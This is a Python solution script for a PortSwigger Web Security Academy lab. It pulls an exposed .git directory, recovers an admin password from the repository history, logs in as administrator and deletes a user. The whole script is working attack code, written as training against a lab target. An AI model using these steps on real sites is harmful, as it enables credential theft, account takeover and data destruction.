# Lab: Information disclosure in version control history

Link to lab: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0ad0000403e1d14ac0255936007800a2.web-security-academy.net/'

response =  requests.get(url+'.git')

# request and use wget -r [url]/.git to download all entire directory git

# cd to downloaded folder and use git reset --hard HEAD^ to restore the files have been removed

# cat that file to get: ADMIN_PASSWORD

ADMIN_PASSWORD = 'swwtg9u9algnqjj13sb6'

# Get login
response = requests.get(url+'login', verify=False)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


# Post login
cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'administrator',
    'password': ADMIN_PASSWORD,
}

response = requests.post(
    url+'login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Delete user carlos
cookies = {
    'session': session,
}
response = requests.get(
    url + 'admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

```